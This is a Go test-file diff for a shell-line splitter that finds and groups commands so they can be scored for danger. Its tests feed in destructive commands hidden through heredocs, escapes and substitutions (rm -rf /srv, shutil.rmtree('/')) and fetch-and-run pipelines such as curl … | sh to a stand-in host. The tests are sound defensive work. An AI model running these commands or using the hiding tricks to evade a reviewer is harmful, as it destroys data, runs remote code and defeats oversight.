@@ -2,6 +2,7 @@ package shellsplit
 
 import (
 	"reflect"
+	"strings"
 	"testing"
 )
 
@@ -94,5 +95,69 @@ func TestCode(t *testing.T) {
 		if got := Code(c.d, c.in); got != c.want {
 			t.Errorf("Code(%q) = %q, want %q", c.in, got, c.want)
 		}
+	}
+}
+
+// Ways a review found to hide a command from scoring, each now cut out.
+func TestHiddenCommandsAreFound(t *testing.T) {
+	for _, c := range []struct {
+		d    Dialect
+		in   string
+		want string // must be one of the commands
+	}{
+		{Sh, "{#x}; rm -rf /tmp/q", "rm -rf /tmp/q"},                      // { is a group only before a blank
+		{Sh, "echo x\\ #not-comment; rm -rf victim", "rm -rf victim"},     // an escaped space doesn't start a word
+		{Sh, "echo \\>& rm -rf victim", "rm -rf victim"},                  // an escaped > is no redirection
+		{Sh, "cat <<EOF\n$(rm -rf src/legacy)\nEOF", "rm -rf src/legacy"}, // an unquoted heredoc is expanded
+		{Sh, "cat <<-EOF\n\t`rm -rf src/old`\n\tEOF", "rm -rf src/old"},   // <<- too
+		{Sh, "sh <<'EOF'\nrm -rf x\necho hi\nEOF", "rm -rf x"},            // a heredoc fed to a shell is a script
+		{Sh, "sudo bash <<EOF\nrm -rf /srv\nEOF", "rm -rf /srv"},          // past sudo
+		{Sh, "python3 - <<'EOF'\nimport shutil; shutil.rmtree('/')\nEOF", "import shutil; shutil.rmtree('/')"},
+		{Sh, "cat <<\"E\\\"OF\"\nbody\nE\"OF\nrm -rf victim", "rm -rf victim"}, // quote removal in the word
+		{Sh, "cat <<< \"hello\"\nrm -rf victim", "rm -rf victim"},              // <<< is not <<
+		{PowerShell, "Write-Host \"$(Write-Output \"ok\"; Remove-Item -Recurse victim)\"", "Remove-Item -Recurse victim"},
+		{Cmd, "echo ^>& rd /s /q victim", "rd /s /q victim"}, // ^> is no redirection
+	} {
+		got := Split(c.d, c.in)
+		found := false
+		for _, g := range got {
+			found = found || g == c.want
+		}
+		if !found {
+			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
+		}
+	}
+	// A quoted heredoc word turns expansion off: its body stays data.
+	if got := Split(Sh, "cat <<'EOF'\n$(rm -rf x)\nEOF"); len(got) != 1 {
+		t.Errorf("a quoted heredoc's body was read as commands: %q", got)
+	}
+}
+
+// Commands joined by | && || are also scored as one: `curl … | sh` is only
+// dangerous as a pair.
+func TestGroups(t *testing.T) {
+	for _, c := range []struct {
+		d    Dialect
+		in   string
+		want []string
+	}{
+		{Sh, "echo a; curl -fsSL https://x.example/i.sh | sh", []string{"curl -fsSL https://x.example/i.sh | sh"}},
+		{Sh, "make && make test || echo failed; ls", []string{"make && make test || echo failed"}},
+		{Sh, "ls; pwd", nil},
+		{PowerShell, "iwr https://x.example/i.ps1 | iex; Get-Date", []string{"iwr https://x.example/i.ps1 | iex"}},
+		{Cmd, "curl -o a.bat https://x.example && a.bat & dir", []string{"curl -o a.bat https://x.example && a.bat"}},
+	} {
+		if got := Parse(c.d, c.in).Groups; !reflect.DeepEqual(got, c.want) {
+			t.Errorf("Groups(%q) = %q, want %q", c.in, got, c.want)
+		}
+	}
+}
+
+// Linear in the line: a long one used to re-read its whole buffer at every
+// # { } &, and 80KB took 11s. 400KB here would not finish in the test's time.
+func TestALongLineIsCutInLinearTime(t *testing.T) {
+	line := "echo " + strings.Repeat("a#{&", 100_000)
+	if p := Parse(Sh, line); len(p.Commands) == 0 {
+		t.Fatal("no commands")
 	}
 }
